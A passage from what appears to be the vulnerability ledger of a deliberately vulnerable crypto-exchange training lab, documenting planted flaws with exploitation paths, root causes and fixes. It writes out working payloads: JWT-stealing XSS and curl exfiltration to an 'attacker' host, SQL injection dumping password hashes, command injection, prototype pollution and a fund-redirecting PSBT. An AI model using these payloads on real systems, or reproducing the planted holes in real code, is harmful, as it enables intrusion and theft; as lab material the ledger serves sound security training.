- **Intended discovery difficulty:** hard
- **Realistic root cause:** OTC desk requested internal transfers as a fee-free workaround so institutional clients could net positions between accounts without broadcasting on-chain. The internal-transfer team scoped the feature as a fast P2 build, didn't consult the user-withdrawal team, and shipped it without limit enforcement because "internal moves aren't withdrawals."
- **Remediation:** Apply the same daily limit ledger to internal transfers (debit the sender's bucket), require Tier-2 (the same tier required to use the OTC desk) for internal transfers, and add an aggregate-velocity check (e.g. "total outgoing transfers in last 24h"). Better: replace internal transfers with proper sub-account semantics where the platform's books still reflect the same underlying custody.
- **Chain membership:** standalone

### V-33: PSBT validate-vs-broadcast parser mismatch (polyglot envelope)

- **Category:** Crypto / Trust boundary
- **Phase introduced:** 7
- **Location:** `apps/web/lib/treasury/coordinator.ts` (the `broadcastDraft` function calls `decodePsbt(psbt)` to validate outputs against `intendedOutputs`, then passes the same `psbt` to the mock node's `finalizepsbt`; the mock's `finalizepsbt` in `apps/bitcoin-mock/src/rpc/index.ts` canonicalizes the envelope to the LAST `BVBE_PSBT_V1:` segment before parsing, while `decodePsbt` in `packages/shared/src/psbt-envelope.ts` reads the FIRST segment)
- **Exploitation path:** This requires a signed treasury draft and the ability to call the broadcast endpoint (treasury or admin role, until Phase 8's emergency-withdraw lifts that to a forged-JWT primitive). Collect 2-of-2 signatures on a draft whose `intendedOutputs` are `[{address: victim, amountSat: 1}]`. Call `POST /api/v2/admin/treasury/drafts/<id>/broadcast` with `{"overridePsbt": "BVBE_PSBT_V1:{\"inputs\":[],\"outputs\":[{\"address\":\"victim\",\"amountSat\":1}],\"signatures\":2,\"fee\":1000}BVBE_PSBT_V1:{\"inputs\":[],\"outputs\":[{\"address\":\"attacker\",\"amountSat\":10000000000}],\"signatures\":2,\"fee\":1000}"}`. The validation step (`decodePsbt`) parses the FIRST envelope, sees the victim output, matches `intendedOutputs`, passes. The broadcast step (mock `finalizepsbt`) splits on the marker, takes the LAST segment, sees the attacker output, broadcasts `RAWTX:[{attacker, 10000000000 sat}]`. Funds land at the attacker address. This is **CHAIN A's signing flaw** — Phase 9's git-history secret leak + Phase 8's forged-JWT admin path will let an attacker reach this endpoint without any insider access.
- **Intended discovery difficulty:** expert
- **Realistic root cause:** The mock's `finalizepsbt` had `canonical = PSBT_MARKER + segs[segs.length - 1]` added late in development to "handle drafts that accumulated metadata preambles during the signing roundtrips" (i.e., defensive code for a problem that never happens in practice with the well-formed single-envelope PSBTs the team tested with). The validation helper in `coordinator.ts` was added later still to address a code review comment ("we should re-check outputs before broadcast") — the engineer added the helper but did not realize the parser's preprocessing step took the last segment while `decodePsbt` took the first. Two parsers, side-by-side, disagreeing only on polyglot inputs the team never tested.
- **Remediation:** Make validation and finalize use the SAME parser — either canonicalize once at the entry point (and pass the canonical form to both validation and finalize), or remove the `last-segment` preprocessing from `finalizepsbt` (single-envelope PSBTs are unchanged). Better: reject any PSBT envelope containing more than one `BVBE_PSBT_V1:` marker at the route layer with a schema-level check, since multi-envelope inputs are never legitimate.
- **Chain membership:** CHAIN A — the signing flaw that routes a treasury withdrawal to an attacker-controlled address. Awaits Phase 8 (forged JWT → emergency-withdraw) and Phase 9 (git-history leak → JWT signing key).

### V-47: RBF fee refund credits the user before the replacement TX confirms

- **Category:** Business logic
- **Phase introduced:** 7
- **Location:** `apps/web/lib/withdrawal/rbf.ts` (the `bumpWithdrawalFee` function calls `bitcoin.bumpfee`, then synchronously credits the user's `Balance.available` with the fee delta when `newFeeSat < oldFeeSat` — no follow-up watcher debits the credit back if the replacement TX is dropped from the mempool)
- **Exploitation path:** Submit a withdrawal of 0.1 BTC with the default fee of 10,000 sat. Wait for the worker to broadcast (`status: broadcast`). Convince a treasury operator (insider, social engineering, or chained with V-19/V-35 admin escalation) to call `POST /api/v2/admin/withdrawals/<id>/bump` with `{"newFeeSat": 100}`. The handler computes `feeDelta = 10000 - 100 = 9900 sat` and credits the user's available balance with `0.0000099 BTC` immediately. The mock's `bumpfee` drops the original TX and creates a replacement at the new low fee — but real miners would not include the replacement; in the lab a follow-on RBF can drop it again. The replacement gets stuck (or dropped); the user keeps the refund credit AND, if the original TX had already started settling, the original withdrawal. Looped across many withdrawals — especially after a benign treasury operator gets tricked into bumping a batch of stuck TXs at very low fees — the cumulative refund credit drains the platform's books slowly without any single anomalous event.
- **Intended discovery difficulty:** medium
- **Realistic root cause:** Engineer building the RBF bump feature wrote the credit code (real exchanges DO refund the difference when a fee bump is *down*, because the user pre-paid the higher fee at submit-time) and tested with the happy path: new TX gets included at the new fee, original is dropped, user's books reconcile. The failure path — replacement dropped, original still settled — wasn't on their checklist because RBF "down" is uncommon and a dropped replacement is even less common. There's no compensating watcher because the team intended to add one "in the next sprint."
- **Remediation:** Issue the refund credit as a *pending* balance entry (separate column) and only flip it to `available` after the replacement TX has 1+ confirmations. If the replacement is dropped, the pending entry is reversed. Better: don't refund on bump at all — debit the new fee at bump-time, refund the OLD fee only when the worker observes a clean replacement-confirmed transition.
- **Chain membership:** standalone

---

## Phase 8 — Admin, treasury, compliance, support

### V-1: Stored XSS in displayName → admin panel

- **Category:** OWASP / XSS
- **Phase introduced:** 8
- **Location:** `apps/web/app/admin/users/page.tsx` (the `nameCell(u)` helper + `<td dangerouslySetInnerHTML={{ __html: nameCell(u) }} />`) and `apps/web/app/admin/users/[id]/page.tsx` (`<h1 ... dangerouslySetInnerHTML={{ __html: nameHtml }} />`).
- **Exploitation path:** Sign up as any user. PATCH `/api/v2/me/profile` (Phase-1 endpoint) and set `displayName` to `<img src=x onerror="fetch('http://attacker/?t='+localStorage['bvbe.access'])">`. When an admin opens `/admin/users` (or `/admin/users/<victimId>`), React injects the displayName directly into the cell HTML; the `onerror` fires in the admin's session and exfiltrates the admin's JWT from `localStorage`. Combined with V-35 / V-41 → admin takeover.
- **Intended discovery difficulty:** easy
- **Realistic root cause:** Engineer wanted to render `displayName` in bold once KYC was approved, and reached for `dangerouslySetInnerHTML` to wrap the value in `<strong>...</strong>` rather than refactoring the parent to compose a React element. The raw user input ended up inside the dangerously-rendered string.
- **Remediation:** Render the label as a plain React text node and wrap with `<strong>` as a JSX element. If HTML decoration is genuinely required, sanitize via DOMPurify with a tight allowlist.
- **Chain membership:** standalone (and a CHAIN B component — admin JWT exfiltration is one of the routes to becoming admin)

### V-6: `/api/v1/internal/*` middleware-trust function-level access

- **Category:** OWASP / Auth / Trust boundary
- **Phase introduced:** 8
- **Location:** `apps/web/middleware.ts` (the `INTERNAL_API_PREFIX` branch — "if `x-bvbe-internal-trace` header is non-empty, skip JWT auth") and `nginx/nginx.conf` (the `location /` strip list lacks a `proxy_set_header x-bvbe-internal-trace "";`).
- **Exploitation path:** Hit any `/api/v1/internal/*` route through the public edge with header `x-bvbe-internal-trace: 1`. The middleware sees the header, assumes the request came from the internal LB, and returns `NextResponse.next()` without checking auth. Useful first stops: `GET /api/v1/internal/users` (full user DB including `passwordHash` and `totpSecret`), `GET /api/v1/internal/users/{id}`. Terminal stop: `POST /api/v1/internal/treasury/emergency-withdraw` (CHAIN A).
- **Intended discovery difficulty:** easy-medium
- **Realistic root cause:** The v1 API namespace was originally fronted by a private nginx that always stamped `x-bvbe-internal-trace` on incoming calls. When the team consolidated the deployment behind a single public nginx, they updated the strip list to include `x-bvbe-user-id` but forgot to add `x-bvbe-internal-trace`. Two header-strip omissions across two phases (V-46 added a third) — realistic team-org failure.
- **Remediation:** Either (i) strip `x-bvbe-internal-trace` at nginx and verify a signed shared-secret instead, (ii) require mTLS client cert for the internal namespace, (iii) drop the bypass entirely and require admin JWT for `/api/v1/internal/*`.
- **Chain membership:** CHAIN A (gate for `/api/v1/internal/treasury/emergency-withdraw`) and CHAIN D (gate for `/api/v1/internal/users` full-DB exfil)

### V-11: SQL injection via `?perf=1` admin user search

- **Category:** OWASP / SQLi
- **Phase introduced:** 8
- **Location:** `apps/web/app/api/v2/admin/users/search/route.ts` (the `if (perf === "1")` branch — `prisma.$queryRawUnsafe(\`SELECT ... WHERE email ILIKE '%${q}%' OR "displayName" ILIKE '%${q}%' ... \`)`).
- **Exploitation path:** Authenticate as an admin (forged JWT, V-19/V-35 path, or legitimate). Hit `GET /api/v2/admin/users/search?perf=1&q=%25%27%20UNION%20SELECT%20id%2C%22passwordHash%22%2C%22totpSecret%22%2Cemail%2C0%20FROM%20users--`. The `q` value is interpolated verbatim into a single-quoted SQL literal; closing the literal with `%'` and UNIONing in additional columns yields password hashes and TOTP secrets from the response. Blind/time-based variants via `pg_sleep` work as well.
- **Intended discovery difficulty:** easy-medium
- **Realistic root cause:** Prisma's ILIKE-based search felt slow on a large staging snapshot of the users table, so a senior engineer added a "performance mode" that built the same query with `$queryRawUnsafe` for direct planner control. The intent was "skip the ORM tax for hot lookups"; the bound parameter was lost in the rewrite.
- **Remediation:** Replace the `$queryRawUnsafe` call with `prisma.$queryRaw` and template-tagged interpolation (which forwards parameters as bound values). Better: keep the Prisma `findMany` path and tune via a partial GIN index on `lower(display_name)` for large tables.
- **Chain membership:** standalone (and a CHAIN D component — direct read of auth material)

### V-12: 2nd-order SQL injection via stored `displayName` in compliance report

- **Category:** OWASP / SQLi
- **Phase introduced:** 8
- **Location:** `apps/web/app/api/v2/admin/compliance/report/route.ts` (the per-case `for` loop — `prisma.$queryRawUnsafe(\`SELECT COUNT(*) ... FROM users WHERE "displayName" LIKE '%${dn}%'\`)` where `dn` is the subject user's stored `displayName`).
- **Exploitation path:** Any user under compliance review controls their own displayName via the normal profile update path (which uses Prisma's parameterized update — safe insert). Set `displayName` to a SQLi payload, e.g. `x' OR (SELECT pg_sleep(5)) IS NULL --`. When an admin runs `GET /api/v2/admin/compliance/report`, the handler pulls active cases, iterates per case, and splats the subject's stored displayName into a raw query. The injection executes server-side; time-based blind exfiltration follows the standard playbook (CASE WHEN ... THEN pg_sleep ELSE 0 END, byte-by-byte against `users.password_hash`).
- **Intended discovery difficulty:** hard
- **Realistic root cause:** Engineer needed "users with similar names — flag potential sybil networks." The Prisma equivalent (`findMany` + JS counting) ran out of memory on a large case batch, so they reached for raw SQL with one query per case. Because `displayName` is stored at user-controlled rest, the Prisma-safe write is the source of an unsafe read.
- **Remediation:** Use `prisma.$queryRaw` with template-tagged interpolation so the displayName is bound, or move the similarity computation into application code with paginated reads. Best: compute the similarity metric offline in the worker and surface a denormalized `similar_count` column.
- **Chain membership:** standalone

### V-17: OS command injection in compliance PDF export

- **Category:** OWASP / Command injection
- **Phase introduced:** 8
- **Location:** `apps/web/app/api/v2/admin/compliance/cases/[id]/export-pdf/route.ts` (the `const cmd = \`pdftk-mock --case ${id} --out /tmp/${name}.pdf 2>/dev/null\`` line, passed to `spawn(cmd, [], { shell: true })`).
- **Exploitation path:** Authenticate as admin. Hit `GET /api/v2/admin/compliance/cases/<existingCaseId>/export-pdf?name=foo;sleep%205;%23`. The `name` query param is concatenated into the command string with no escaping. With `shell: true`, the shell parses the `;sleep 5;` and executes a second command before the PDF output redirect. Side channels: `;curl -d @/etc/passwd http://attacker;` (against the docker network — the SSRF egress concern lives in V-40, not here), `;ping -c 1 attacker-host;` etc. The mock `pdftk-mock` script may not exist on PATH; that is acceptable in the lab — the injected command runs first, observed as a measurable delay or out-of-band signal.
- **Intended discovery difficulty:** medium
- **Realistic root cause:** Engineer building the PDF export needed to silence `pdftk`'s chatty stderr ("operator info" lines) and reached for `shell: true` to use shell redirection (`2>/dev/null`) rather than wiring `child.stderr.on('data', ...)` and dropping the chunks. With `shell: true`, the argv-array discipline that protects native `spawn` calls is gone — the single command string is parsed by `sh -c`, and any concatenated user input becomes a shell tokenization vector.
- **Remediation:** Drop `shell: true`. Use `spawn("pdftk-mock", ["--case", id, "--out", `/tmp/${path.basename(name)}.pdf`], { stdio: ["ignore", "pipe", "ignore"] })` — argv-array form means each element is a single argv token, immune to shell parsing. If shell redirection is genuinely required, build the string with `path.basename(name)` whitelist + a strict alphanumeric regex check.
- **Chain membership:** standalone

### V-18: mutation XSS via single-quoted attribute sink in admin ticket renderer

- **Category:** OWASP / XSS / mXSS
- **Phase introduced:** 8
- **Location:** `packages/shared/src/markdown.ts` (`sanitizeForAdmin` — the regex `/on\w+\s*=\s*"[^"]*"/gi` matches only double-quoted `on*` handlers) → consumed by `apps/web/app/api/v2/admin/tickets/[id]/route.ts` (returns `bodyHtml = sanitizeForAdmin(m.bodyMd)`) and rendered by `apps/web/app/admin/tickets/[id]/page.tsx` via `dangerouslySetInnerHTML`.
- **Exploitation path:** Open a support ticket as any user. In the ticket body, include the markdown HTML pass-through `<img src=x onerror='alert(1)'>` (single quotes) or `<img src=x onerror=alert(1)>` (unquoted). The admin sanitizer's `on*` regex requires double quotes, so the handler survives. The admin opens `/admin/tickets/<id>` — `dangerouslySetInnerHTML` injects the surviving HTML into the agent's session and the handler fires. Exfiltrates the admin JWT via `localStorage["bvbe.access"]` the same way V-1 does. The user-facing renderer at `/support/tickets/[id]` uses `sanitizeForUser` which strips all tags — the mXSS is admin-only by design.
- **Intended discovery difficulty:** medium
- **Realistic root cause:** Engineer hand-rolled a small sanitizer because "the team's PR review burned out on adding a heavyweight HTML sanitizer dep, so a regex is fine for now." The regex pattern was lifted from a Stack Overflow answer that only covered double-quoted attributes. The user-side renderer was given the strict treatment because end-user injection felt scarier ("user replies could attack the user back").
- **Remediation:** Replace the regex with DOMPurify (`isomorphic-dompurify` works in both Node and the browser). Don't roll a custom HTML sanitizer.
- **Chain membership:** standalone (and a CHAIN B component — admin JWT exfiltration via stored XSS)

### V-15: Vulnerable transitive dep — `xml2js@0.4.23` (CVE-2023-0842) reached via OFAC sanctions importer

- **Category:** Infra / Supply chain (SCA)
- **Phase introduced:** 9
- **Location:** `apps/web/package.json` (pinned `"xml2js": "0.4.23"`), consumed by `apps/web/lib/compliance/sanctions-import.ts` (`parseString` call) — invoked by `apps/web/app/api/v2/admin/compliance/sanctions-import/route.ts`.
- **Exploitation path:** Supply-chain / SCA finding. The pinned `xml2js@0.4.23` is a known-vulnerable dependency (CVE-2023-0842, prototype pollution) that is **audit-discoverable** (`pnpm audit` flags it directly) and is genuinely reachable at runtime via `POST /api/v2/admin/compliance/sanctions-import` (admin-gated). Discovery deliverable = the SCA hit plus a demonstration that the vulnerable parser is on a live, reachable code path. **Scope note (live-verified, exploitation tranche `15-not-reproduced-assessment.md`):** the importer in `sanctions-import.ts` reads `parsed.sanctions` and maps it — it does **not** merge the parsed object into a shared or prototype-reachable sink, so any `__proto__` pollution stays local to the discarded `parsed` object. `GET /api/v2/me/flags` was confirmed to stay `{}` after every canonical `__proto__` payload. There is therefore **no live privilege-escalation chain through V-15** against HEAD; V-15 is a pure SCA plant. The working, end-to-end prototype-pollution path in this lab is **V-34** (hand-rolled deepMerge in trade-debug replay → `resolveFlags` → `/me/flags`), which is independently proven live and is unaffected by this re-scope.
- **Intended discovery difficulty:** medium (admin-gated reachability; `pnpm audit` shows the CVE directly; the route advertises itself as "Beta" in the compliance UI)
- **Realistic root cause:** Compliance team requested an OFAC sanctions-list importer as a future feature. Engineer pinned `xml2js@0.4.23` (the version on the docs site at the time of research), wrote a minimal `parseString` integration, shipped it behind a beta flag, and moved on. The CVE was published after the integration shipped; no one ran `pnpm audit` against the private repo before lab release.
- **Remediation:** Upgrade to `xml2js@>=0.5.0` (the CVE fix). For defense in depth, pass `{ explicitArray: true, explicitRoot: true }` and reject any element whose tag matches `__proto__|constructor|prototype` before merging. Better: use a maintained XML parser like `fast-xml-parser` with prototype-pollution protections enabled.
- **Chain membership:** standalone SCA finding. (Earlier ledger text described V-15 as a "second route to V-34's `Object.prototype.adminPanel` → `/me/flags` sink"; that privesc-chain framing is **withdrawn** — it does not reproduce against the shipped importer. V-15 stands on its own as a vulnerable-dependency-on-a-reachable-path finding. Do **not** upgrade `xml2js` — the vulnerable pin is the plant.)

### V-48: JWT signing secret leaked in git history via `.env.bak`

- **Category:** Infra / Supply chain / Secrets
- **Phase introduced:** 9
- **Location:** Two consecutive commits in git history: `193426c` ("ops: archive .env for rollback during phase-7 hotfix") adds `.env.bak`; `e96ffd8` ("ops: remove .env.bak (committed in error)") removes it. The file is no longer present in `HEAD`; the contents — including `JWT_SECRET=devsecret-do-not-use-in-prod-bvbe-2026` — live in git history forever. The same secret value is the literal `JWT_SECRET` in `docker-compose.yml` (`web` and `ws-gateway` services), so the discovered key actually verifies against the running stack.
- **Exploitation path:** Recon — `git log --all -p -- .env.bak` (or `git log --all -p | grep -i jwt_secret`, or `git log --all --diff-filter=D --summary | grep delete`) reveals the deleted file's contents. Extract `JWT_SECRET=devsecret-do-not-use-in-prod-bvbe-2026`. With the secret in hand, sign an HS256 JWT with `iss=bvbe`, `aud=bvbe-web`, `role=admin`, `sub=<any-user-id>` — the running stack accepts it. This unlocks CHAIN A's final step (combine with V-6 to reach `/api/v1/internal/treasury/emergency-withdraw`, V-33 polyglot PSBT to drain) and CHAIN D's fast path (`GET /api/v1/internal/users` for full PII).
- **Intended discovery difficulty:** easy-to-medium (standard recon move; a `git log --all -p` over a few-thousand-commit repo finishes in seconds, and "scan history for secrets" is in the early playbook of any external attacker)
- **Realistic root cause:** Ops engineer needed a local config for a one-off testing session, copied `.env` to `.env.bak`, committed it by accident as part of a larger ops change, noticed in review, removed it in the next commit — but the secret stays in git history forever. Classic incident. The runtime `JWT_SECRET` was never rotated after the discovery, on the (incorrect) reasoning that "the lab is internal anyway."
- **Remediation:** (a) Rotate the JWT signing secret immediately; (b) rewrite history with `git filter-repo` or BFG to purge the blob, then force-push (acknowledging this is destructive); (c) audit access logs for any JWTs signed with the leaked key during the window; (d) move secrets into a dedicated secret manager (Vault, AWS Secrets Manager) with no path through git for any future incident; (e) add a pre-receive hook with `gitleaks` / `trufflehog` scanning to block secrets from ever being committed.
- **Chain membership:** CHAIN A (terminal enabler — turns the chain from insider to zero-knowledge) and CHAIN D fast path (forge admin JWT → V-6 → `/api/v1/internal/users` full PII dump)

### V-49: Dependency confusion artifact — `@bvbe-internal/observability` referenced without `.npmrc` registry pin

- **Category:** Infra / Supply chain
- **Phase introduced:** 9
- **Location:** `apps/web/package.json` (`optionalDependencies` entry for `@bvbe-internal/observability`), consumed by `apps/web/lib/observability.ts` via a lazy `import()`. No top-level `.npmrc` exists at the repo root pinning the `@bvbe-internal` scope to a private registry.
- **Exploitation path:** Documentation-only PoC (publishing to public npm is out of lab scope). An attacker who publishes a `@bvbe-internal/observability` package to the public npm registry will see it pulled in whenever someone runs `pnpm install` outside the Blaze internal network (where there is no `.npmrc` pinning the scope to the private registry). The package's install hooks — and, post-install, its imported module body via the `await import()` in `apps/web/lib/observability.ts` — execute under the engineer's user. With write access to `node_modules/.bin` and the dev machine, the attacker has a foothold for SSH key exfil, source-code tampering, or build-server pivot.
- **Intended discovery difficulty:** hard (requires reading `apps/web/package.json`, noticing the missing `.npmrc`, knowing the dependency-confusion attack pattern from Birsan 2021)
- **Realistic root cause:** The team's internal observability package is hosted on Blaze's private npm registry. The repo was never set up with a top-level `.npmrc` because "the build machine has the right `.npmrc`." Anyone running the build outside Blaze infra is vulnerable. The `optionalDependencies` block was chosen (rather than `dependencies`) so that builds in environments without registry access wouldn't fail — masking the gap.
- **Remediation:** Add a top-level `.npmrc` pinning the `@bvbe-internal` scope to the private registry: `@bvbe-internal:registry=https://npm.internal.blazeinfosec.com`. Reserve the `@bvbe-internal` scope on public npm with a stub package owned by the org. Add a CI check that fails if `pnpm install` resolves any `@bvbe-internal/*` package from the public registry. Long-term: move internal packages to a workspace-local path or a git URL so the dependency graph is unambiguous.
- **Chain membership:** standalone (build-machine compromise foothold — outside the four killer chains but a realistic auxiliary breach path)

### V-50: nginx CL/TE-tolerant configuration + upstream `--insecure-http-parser` enables request smuggling

- **Category:** Infra / OWASP / HTTP smuggling
- **Phase introduced:** 9
- **Location:** Two-part plant. (1) `nginx/nginx.conf` (the catchall `location /` block) — the three directives `proxy_pass_request_headers on; ignore_invalid_headers off; underscores_in_headers on;` allow both `Content-Length` and `Transfer-Encoding: chunked` to pass through to the upstream Next.js process. (2) `docker-compose.yml` — the `web` service environment carries `NODE_OPTIONS: "--insecure-http-parser"`, which tells Node's `llhttp` parser to accept the ambiguous CL+TE framing nginx forwards instead of rejecting it with `HPE_UNEXPECTED_CONTENT_LENGTH` / 400. Without **both** halves the smuggle does not reach a vulnerable handler — modern Node 20 strictly rejects CL+TE by default, so the nginx-only plant alone is not enough.
- **Exploitation path:** Send a single TCP request to the public edge with both `Content-Length` and `Transfer-Encoding: chunked` headers. nginx forwards the full body (per `Content-Length`) to the upstream; the upstream Next.js parser (with `--insecure-http-parser` enabled) accepts the request and prefers `Transfer-Encoding: chunked`, stopping at the chunked-terminator. The bytes after the terminator are interpreted as the start of a *second* HTTP request on the same connection. If a legitimate authenticated user is pipelined behind the attacker on the same connection, the smuggled request inherits the connection state — including session affinity, but more importantly the next legitimate request's authentication. Concrete CHAIN B exploit: smuggle `PATCH /api/v2/me` with `{"role":"admin"}` body into a legitimate user's connection, leveraging **V-51** (mass-assignment Route Handler on `PATCH /api/v2/me`) to promote that user to admin. The promoted user then plants a second admin row for persistence.
- **Intended discovery difficulty:** medium-to-hard (requires HTTP-smuggling knowledge; the `OPS-2024-117` comment appears in **both** `nginx.conf` and `docker-compose.yml` and the matching CHANGELOG entry points at the right surface for an alert reader. A trainee who finds only the nginx directives gets stuck at upstream rejection until they also notice `NODE_OPTIONS`.)
- **Realistic root cause:** Ops added the three nginx directives to support a legacy mobile-app client that was sending both `Content-Length` and `Transfer-Encoding` headers (the client was buggy; the mobile team was slow to ship a fix). When that change alone didn't fix client connectivity — because Node 20 was rejecting the now-forwarded requests with `HPE_UNEXPECTED_CONTENT_LENGTH` — the same ops engineer added `NODE_OPTIONS=--insecure-http-parser` to the web container "as a temporary workaround until the mobile team ships." Both halves were tracked under ticket **OPS-2024-117** ("legacy mobile-app client compatibility"), closed without a security review. The Stack Overflow thread the engineer found endorsed `proxy_pass_request_headers on` as a "let the upstream decide" idiom, and Node's documentation describes `--insecure-http-parser` as restoring "more lenient" parsing behaviour — neither warning surfaced "this is a request-smuggling primitive."
- **Remediation:** Remove all three nginx directives — nginx's defaults reject requests with both `Content-Length` and `Transfer-Encoding` (RFC 7230 §3.3.3 step 3). Remove `--insecure-http-parser` from `NODE_OPTIONS`; Node's strict parser is the second line of defence and must stay strict. If the mobile client genuinely needs lenient framing, terminate that traffic on a dedicated, isolated edge rather than the shared user-facing one. Add a WAF / edge rule that drops requests presenting both headers. Add integration tests that hit the public edge with smuggling probes and assert 400 responses. Pair with explicit field allow-lists on every `prisma.user.update` call so that even a successful smuggle cannot mass-assign privileged columns (see V-51 remediation).
- **Live-verified status (exploitation tranche `15-not-reproduced-assessment.md`):** Both halves of the misconfiguration are **present and live** — the three CL/TE-tolerant directives are in `nginx.conf` and the `web` container runs with `NODE_OPTIONS=--insecure-http-parser` (the web log prints `Warning: Using insecure HTTP parsing`). This is a valid, audit-discoverable config finding as it stands. However, a **clean, unambiguous front-end/back-end desync did NOT reproduce** against the shipped edge: **nginx 1.25.5 rejects the CL+TE conflict with `400`** (RFC 7230 §3.3.3) regardless of the forwarding directives — the directives forward headers but do not disable nginx's own conflict check. Header-obfuscation variants (space-before-colon, tab value, duplicate TE, underscore, TE-only) returned `400`/`501` or behaviour consistent with benign HTTP pipelining, not a proven cross-request desync. The modern edge defends this analogously to how it blunts V-35. A working end-to-end smuggle would require **pinning a deliberately-lenient edge** (an older nginx build, or a different proxy that tolerates CL+TE) in front of the `--insecure-http-parser` upstream — flagged as an **optional future infra choice, NOT done now**. Do **not** alter `nginx.conf` or `docker-compose.yml` to chase this; the misconfig must stay as-shipped.
- **Chain membership:** CHAIN B (the intended smuggling primitive that would let a non-admin attacker land a privileged JSON Route Handler call against a legitimate user's connection; pairs with V-51). **CHAIN B's terminal impact still closes independently of the smuggle:** the mass-assignment endpoint **V-51** (`PATCH /api/v2/me {"role":"admin"}`) is proven live, so the chain's "promote to admin" outcome is demonstrable standalone; only the V-50 *delivery* step is env-dependent against the modern edge.

### V-51: Mass assignment on `PATCH /api/v2/me` profile update

- **Category:** OWASP / Broken access control / Mass assignment
- **Phase introduced:** 9 (fix-up)
- **Location:** `apps/web/app/api/v2/me/route.ts` — the `PATCH` Route Handler. The zod schema (`patchSchema`) accepts `email`, `displayName`, `role`, `kycTier`, `feeTier`. The validated body is forwarded verbatim as `prisma.user.update({ where: { id: claims.sub }, data: parsed.data })`. No column-level allow-list; no separation between user-mutable and admin-mutable fields.
- **Exploitation path:** Send `PATCH /api/v2/me` with `Authorization: Bearer <any-valid-user-JWT>` and body `{"role":"admin"}` (or `{"kycTier":3}`, or both). The handler validates the body, finds nothing to reject — `role` is just `z.string().optional()` with no enum constraint — and forwards `{role: "admin"}` to Prisma, which updates the caller's row, promoting them to admin. Subsequent requests carrying the same JWT pass `requireAdmin` checks (the middleware re-reads `role` from the DB on each request via `userFromAuthorization`'s row lookup, so the change takes effect immediately). Used in CHAIN B as the terminal mass-assignment surface for a CL/TE-smuggled `PATCH /api/v2/me` (V-50), promoting whichever legitimate user's TCP connection the smuggle landed on.
- **Intended discovery difficulty:** hard (the handler looks ordinary; the validator looks defensive; the bug is the missing enum on `role` and the absence of a column-level allow-list. A reviewer has to notice that `z.string().optional()` is a strictly weaker constraint than the `Role` enum the User model expects, and that `parsed.data` is forwarded straight into `update.data`.)
- **Realistic root cause:** The engineer wanted to add partial profile updates (display name, email change with re-verification, etc.) and reused the same "validate then forward" idiom from `kyc/profile/route.ts`. They added `role` and `kycTier` to the validator because the admin UI used the same component shape and they wanted one schema to cover both call sites. They assumed the JWT `sub` claim — which constrains the *row* the update targets — also constrained the *columns*: "an attacker can only update their own row, so the worst they can do is rename themselves." They didn't think through "their own row is the row that gets promoted." A peer reviewer skimmed the diff, saw `prisma.user.update({where: {id: claims.sub}, ...})`, agreed that the row was properly scoped, and missed the column-level reach.
- **Remediation:** Replace the verbatim forward with an explicit per-field assembly that only includes user-mutable columns: `data: { email: parsed.data.email, displayName: parsed.data.displayName }`. Move `role`, `kycTier`, and `feeTier` out of this schema entirely; they belong on admin-only endpoints (`PATCH /api/v2/admin/users/[id]`). If a single component must serve both call sites, give it two schemas and route by caller role server-side. Add a unit test that asserts a `PATCH /api/v2/me` with `{role:"admin"}` is either rejected or silently strips the field. As defence-in-depth, narrow the Prisma client used by user-facing handlers with a typed wrapper that disallows writes to `role` / `kycTier` / `feeTier`.
- **Chain membership:** CHAIN B (the mass-assignment primitive that pairs with V-50's smuggling primitive to land an admin promotion on a legitimate user's session).

### V-34: Prototype pollution via hand-rolled deepMerge in trade-debug replay

- **Category:** OWASP / Prototype pollution
- **Phase introduced:** 8
- **Location:** `apps/web/app/api/v1/internal/trade-debug/replay/route.ts` (the hand-rolled `deepMerge({ ...DEFAULT_CONFIG }, parsed.data.config ?? {})` call) — downstream reader: `apps/web/lib/feature-flags.ts` (`resolveFlags` uses `for...in` over a prototype-backed defaults object, so inherited properties surface as own keys on the returned flag map).
- **Exploitation path:** Step 1 — bypass `/api/v1/internal/*` auth via V-6 (`x-bvbe-internal-trace: 1`). Step 2 — POST the NESTED-envelope payload `{"scenario":"foo","config":{"a":{"__proto__":{"adminPanel":true}}}}` to `/api/v1/internal/trade-debug/replay`. The top-level form `{"config":{"__proto__":{...}}}` is silently stripped by zod's `z.record(z.unknown())` (zod 3 drops own-enumerable `__proto__` keys at the top of a record parse); the nested envelope survives because zod does not recurse-strip through `z.unknown()` leaves. The hand-rolled deepMerge then recurses into `config.a`, iterates `Object.keys({__proto__:{...}})` which yields `__proto__`, walks into `target["a"]["__proto__"]` (which resolves to `Object.prototype`), and merges `{adminPanel: true}` into it — mutating `Object.prototype.adminPanel = true` for the lifetime of the process. Step 3 — call `GET /api/v2/me/flags` as any authenticated user with no `flags` claim on their JWT. `resolveFlags` builds `defaults = Object.create({})` (prototype is `Object.prototype`, which now carries `adminPanel`), and the `for...in` loop walks the prototype chain — copying `adminPanel: true` onto the returned `flags` map as an own property, so `JSON.stringify` serializes it. The response shows `{ flags: { adminPanel: true } }` — the admin nav opens for the polluted-prototype user. Combined with V-6, the polluted user can now reach the internal namespace's data endpoints (no admin JWT required, just the spoofable trace header). Note: the `feature-flags.test.ts` "scenario" test demonstrates the gadget with the inline `deepMerge` to bypass the zod schema; end-to-end route reach requires the nested envelope form.
- **Intended discovery difficulty:** hard
- **Realistic root cause:** Two careless choices that look reasonable in isolation: (a) the engineer hand-rolled `deepMerge` to avoid pulling lodash's full deep-merge weight (a common micro-optimization in Next.js apps trying to keep the server bundle small) and wrote the canonical loop `for (const key of Object.keys(source)) { ... target[key] = ... }` — exactly the prototype-pollution gadget that's been described in dozens of CVE writeups, but easy to write if you're not thinking about `__proto__` as a possible key. (b) The engineer who wrote `resolveFlags` used `for...in` over a defaults object instead of `Object.keys`, because they wanted "framework default flag inheritance" — defaults set on a shared prototype should bubble through to every resolver call without explicit registration. `for...in` walks the prototype chain, which is exactly the desired behavior for inherited defaults — and exactly the bridge that turns a polluted `Object.prototype` into a serializable `flags` payload.
- **Remediation:** In the deepMerge, reject keys in `["__proto__", "constructor", "prototype"]` before recursing; or build on a null-prototype object (`Object.create(null)`) so writes to `__proto__` become a plain own property. In `resolveFlags`, switch to `Object.keys` (own properties only) and an explicit allowlist of known flag names. Add a defense-in-depth `Object.freeze(Object.prototype)` at process start. Prefer `structuredClone` + explicit overlay over hand-rolled merges entirely.
- **Chain membership:** standalone (chain enrichment for "admin nav exposure for non-admins" — not part of CHAIN A/B/C/D's terminal moves, but a useful pivot)

---

## Killer chains — current state

